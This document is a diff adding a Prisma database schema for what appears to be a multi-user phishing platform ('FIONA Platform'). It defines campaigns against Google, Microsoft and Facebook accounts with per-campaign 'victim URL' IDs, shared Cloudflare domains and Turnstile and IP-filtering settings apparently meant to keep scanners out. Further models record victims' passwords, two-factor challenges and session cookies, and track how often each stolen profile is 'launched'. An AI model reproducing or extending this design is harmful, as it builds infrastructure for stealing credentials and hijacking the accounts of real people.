@@ -1,0 +1,396 @@
+generator client {
+  provider = "prisma-client-js"
+  binaryTargets = ["native", "debian-openssl-3.0.x"]
+}
+
+datasource db {
+  provider = "sqlite"
+  url      = env("DATABASE_URL")
+}
+
+// ============================================
+// USER MANAGEMENT SYSTEM
+// ============================================
+
+model User {
+  id              String          @id @default(uuid())
+  email           String          @unique
+  password        String          // bcrypt hashed
+  role            String          @default("TECHNICIAN") // ADMIN | TECHNICIAN
+  status          String          @default("PENDING")     // PENDING | ACTIVE | SUSPENDED | BANNED
+  
+  // API Access
+  apiKey          String?         @unique
+  apiKeyLastUsed  DateTime?
+  
+  // Metadata
+  fullName        String?
+  company         String?
+  phoneNumber     String?
+  
+  // Tracking
+  lastLoginAt     DateTime?
+  lastLoginIp     String?
+  loginCount      Int             @default(0)
+  
+  // Approval
+  approvedAt      DateTime?
+  approvedBy      String?         // Admin user ID who approved
+  
+  // Timestamps
+  createdAt       DateTime        @default(now())
+  updatedAt       DateTime        @updatedAt
+  
+  // Relations
+  campaigns       Campaign[]
+  
+  @@index([email])
+  @@index([status])
+  @@index([role])
+  @@index([createdAt])
+}
+
+// ============================================
+// CAMPAIGN SYSTEM
+// ============================================
+
+model Campaign {
+  id                String              @id @default(uuid())
+  userId            String
+  user              User                @relation(fields: [userId], references: [id], onDelete: Cascade)
+  
+  // Campaign Details
+  name              String              // "Q1 Gmail Campaign"
+  description       String?
+  provider          String              @default("GOOGLE") // GOOGLE | MICROSOFT | FACEBOOK | etc.
+  captureId         String              @unique // Short ID for victim URL (8-12 chars)
+  
+  // Settings (from admin pool)
+  domainId          String?
+  domain            Domain?             @relation(fields: [domainId], references: [id], onDelete: SetNull)
+  
+  turnstileEnabled  Boolean             @default(true)
+  turnstileSiteKey  String?             // Inherited from admin pool
+  
+  ipShieldEnabled   Boolean             @default(true)
+  
+  // Statistics
+  viewCount         Int                 @default(0)
+  captureCount      Int                 @default(0)
+  
+  // Status
+  status            String              @default("ACTIVE") // ACTIVE | PAUSED | ARCHIVED | DELETED
+  
+  // Timestamps
+  createdAt         DateTime            @default(now())
+  updatedAt         DateTime            @updatedAt
+  lastActivityAt    DateTime?
+  
+  // Relations
+  captures          CapturedProfile[]
+  authSessions      AuthSession[]
+  
+  @@index([userId])
+  @@index([captureId])
+  @@index([status])
+  @@index([provider])
+  @@index([userId, createdAt])
+  @@index([userId, status])
+}
+
+// ============================================
+// ADMIN SETTINGS (SINGLETON)
+// ============================================
+
+model AdminSettings {
+  id                    String   @id @default("singleton")
+  
+  // Registration Settings
+  autoApproveUsers      Boolean  @default(false)
+  requireEmailVerify    Boolean  @default(false)
+  allowRegistration     Boolean  @default(true)
+  
+  // Default Campaign Settings
+  defaultTurnstileEnabled   Boolean  @default(true)
+  defaultIpShieldEnabled    Boolean  @default(true)
+  
+  // Turnstile Global Config
+  turnstileSiteKey      String?
+  turnstileSecretKey    String?
+  
+  // Cloudflare Global Config
+  cloudflareApiToken    String?
+  cloudflareAccountId   String?
+  
+  // IP Shield Global Config
+  ipShieldMode          String   @default("OFF") // WHITELIST | BLACKLIST | OFF
+  ipShieldWhitelist     String?  // JSON array
+  ipShieldBlacklist     String?  // JSON array
+  
+  // Platform Info
+  platformName          String   @default("FIONA Platform")
+  supportEmail          String?
+  
+  // Timestamps
+  createdAt             DateTime @default(now())
+  updatedAt             DateTime @updatedAt
+}
+
+// ============================================
+// INFRASTRUCTURE (Shared by all technicians)
+// ============================================
+
+model CloudflareAccount {
+  id             String   @id @default(uuid())
+  name           String
+  email          String
+  apiToken       String
+  accountId      String
+  nameserver1    String
+  nameserver2    String
+  turnstileSiteKey    String?
+  turnstileSecretKey  String?
+  status         String   @default("ACTIVE")
+  domainsCount   Int      @default(0)
+  createdAt      DateTime @default(now())
+  updatedAt      DateTime @updatedAt
+  domains        Domain[]
+  turnstileWidgets TurnstileWidget[]
+
+  @@index([status])
+}
+
+model TurnstileWidget {
+  id                    String            @id @default(uuid())
+  sitekey               String            @unique
+  secret                String
+  name                  String
+  cloudflareAccountId   String
+  cloudflareAccount     CloudflareAccount @relation(fields: [cloudflareAccountId], references: [id], onDelete: Cascade)
+  domainsCount          Int               @default(0)
+  maxDomains            Int               @default(10)
+  createdAt             DateTime          @default(now())
+  updatedAt             DateTime          @updatedAt
+
+  @@index([cloudflareAccountId])
+  @@index([sitekey])
+}
+
+model Domain {
+  id                    String             @id @default(uuid())
+  domain                String             @unique
+  subdomain             String?
+  cloudflareAccountId   String
+  cloudflareAccount     CloudflareAccount  @relation(fields: [cloudflareAccountId], references: [id])
+  zoneId                String?
+  aRecordId             String?
+  wildcardRecordId      String?
+  nameserver1           String?
+  nameserver2           String?
+  status                String             @default("PENDING") // PENDING | ACTIVE | FAILED | SUSPENDED
+  sslStatus             String?
+  sslError              String?
+  dnsStatus             String?
+  turnstileSiteKey      String?
+  turnstileSecretKey    String?
+  lastCheckedAt         DateTime?
+  createdAt             DateTime           @default(now())
+  updatedAt             DateTime           @updatedAt
+  campaigns             Campaign[]
+
+  @@index([cloudflareAccountId])
+  @@index([status])
+  @@index([domain])
+}
+
+// ============================================
+// IP SHIELD
+// ============================================
+
+model IPWhitelist {
+  id                String        @id @default(uuid())
+  ipAddress         String
+  captureId         String?
+  reason            String
+  addedBy           String
+  active            Boolean       @default(true)
+  addedAt           DateTime      @default(now())
+
+  @@index([ipAddress])
+  @@index([captureId])
+  @@index([active])
+}
+
+model IPBlacklist {
+  id                String        @id @default(uuid())
+  ipAddress         String
+  reason            String
+  addedBy           String?
+  active            Boolean       @default(true)
+  autoBlacklisted   Boolean       @default(false)
+  blacklistedAt     DateTime      @default(now())
+
+  @@index([ipAddress])
+  @@index([active])
+}
+
+model ThreatLog {
+  id                String        @id @default(uuid())
+  ipAddress         String
+  captureId         String
+  threatType        String
+  severity          String
+  userAgent         String?
+  timestamp         DateTime      @default(now())
+
+  @@index([ipAddress])
+  @@index([captureId])
+  @@index([severity])
+  @@index([timestamp])
+}
+
+model IPAccessLog {
+  id                String        @id @default(uuid())
+  ipAddress         String
+  captureId         String
+  userAgent         String?
+  timestamp         DateTime      @default(now())
+
+  @@index([ipAddress])
+  @@index([captureId])
+  @@index([timestamp])
+}
+
+// ============================================
+// HEADLESS AUTHENTICATION (Campaign-linked)
+// ============================================
+
+model AuthSession {
+  id                String        @id @default(uuid())
+  
+  // Campaign Association
+  campaignId        String
+  campaign          Campaign      @relation(fields: [campaignId], references: [id], onDelete: Cascade)
+  
+  captureId         String
+  email             String
+  password          String?
+  status            String        @default("INITIATED") // INITIATED | REQUIRES_PASSWORD | REQUIRES_2FA | AUTHENTICATED | FAILED | EXPIRED
+  challengeType     String?       // TOTP | SMS | VOICE | PUSH | etc.
+  challengeMetadata String?
+  browserContext    String?
+  cookies           String?
+  fingerprint       String?
+  ipAddress         String?
+  userAgent         String?
+  error             String?
+  createdAt         DateTime      @default(now())
+  updatedAt         DateTime      @updatedAt
+  expiresAt         DateTime?
+
+  @@index([campaignId])
+  @@index([captureId])
+  @@index([email])
+  @@index([status])
+  @@index([createdAt])
+}
+
+model CapturedProfile {
+  id              String        @id @default(uuid())
+  
+  // Campaign Association
+  campaignId      String
+  campaign        Campaign      @relation(fields: [campaignId], references: [id], onDelete: Cascade)
+  
+  email           String
+  password        String
+  cookies         String
+  domain          String
+  provider        String        @default("GOOGLE")
+  status          String        @default("NEVER_LAUNCHED")
+  launchCount     Int           @default(0)
+  lastLaunched    DateTime?
+  captureId       String
+  metadata        String?
+  createdAt       DateTime      @default(now())
+  updatedAt       DateTime      @updatedAt
+  
+  @@index([campaignId])
+  @@index([captureId])
+  @@index([email])
+  @@index([status])
+  @@index([provider])
+  @@index([campaignId, createdAt])
+}
+
+model ActiveSession {
+  id              String        @id @default(uuid())
+  profileId       String
+  email           String
+  browserPid      String?
+  contextId       String?
+  status          String        @default("ACTIVE")
+  launchedAt      DateTime      @default(now())
+  lastActivity    DateTime      @default(now())
+  closedAt        DateTime?
+  
+  @@index([profileId])
+  @@index([email])
+  @@index([status])
+  @@index([launchedAt])
+}
+
+// ============================================
+// DEPRECATED MODELS (TO BE REMOVED)
+// ============================================
+
+// These models are kept for data migration only
+// Will be removed after migration is complete
+
+model Tenant {
+  id        String    @id @default(uuid())
+  name      String
+  createdAt DateTime  @default(now())
+  updatedAt DateTime  @updatedAt
+}
+
+model License {
+  id           String        @id @default(uuid())
+  licenseKey   String        @unique
+  status       String        @default("ACTIVE")
+  plan         String
+  maxSessions  Int           @default(-1)
+  expiresAt    DateTime?
+  createdAt    DateTime      @default(now())
+  updatedAt    DateTime      @updatedAt
+}
+
+model Session {
+  id                String        @id @default(uuid())
+  email             String        @default("")
+  username          String?
+  password          String?
+  provider          String
+  status            String        @default("PENDING")
+  cookies           String?
+  metadata          String?
+  browserMode       String        @default("CAPTURE")
+  lastVerifiedAt    DateTime?
+  domainUsed        String?
+  ipAddress         String?
+  userAgent         String?
+  browser           String?
+  timezone          String?
+  country           String?
+  region            String?
+  city              String?
+  isp               String?
+  connectionType    String?
+  twoFactorEnabled  Boolean       @default(false)
+  createdAt         DateTime      @default(now())
+  updatedAt         DateTime      @updatedAt
+
+  @@index([status])
+  @@index([provider])
+  @@index([email])
+}
